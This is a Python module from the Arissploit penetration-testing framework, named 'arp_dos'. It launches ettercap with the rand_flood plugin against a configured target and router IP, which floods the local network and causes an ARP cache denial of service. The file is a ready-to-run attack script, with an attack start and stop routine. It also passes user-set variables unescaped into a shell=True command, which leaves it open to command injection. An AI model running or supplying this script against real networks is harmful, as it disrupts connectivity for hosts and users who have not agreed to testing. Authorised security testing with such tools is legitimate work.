#!/usr/bin/env python3

#            ---------------------------------------------------
#                           Arissploit Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core.arissploit import *
from core import colors
import subprocess
from time import sleep
import os

conf = {
	"name": "arp_dos",
	"version": "1.0",
	"shortdesc": "ARP cache denial of service.",
	"author": "Entynetproject",
	"initdate": "3.3.2019",
	"lastmod": "31.12.2019",
	"needroot": 1,
	"apisupport": False,
	"dependencies": ["xterm", "ettercap"]

}


# List of the variables
variables = OrderedDict((
	('target', ['192.168.1.2', 'Target IP address.']),
	('router', ['192.168.1.1', 'Router IP address.']),
	('interface', ['eth0', 'Network interface name.']),
))


# Additional help notes
help_notes = colors.red+"This module will not work without root permissions!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("Attack has been started...")
	command = 'xterm -e ettercap -i '+ variables['interface'][0] + ' -Tq -P rand_flood ' + '/'+variables['router'][0]+'//' + ' ' + '/'+variables['target'][0]+'//'
	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
	line_4 = colors.blue+"To stop attack press [enter]"+colors.end
	fin = input(line_4)
	os.system('killall ettercap')
	printInfo("Attack stopped.")
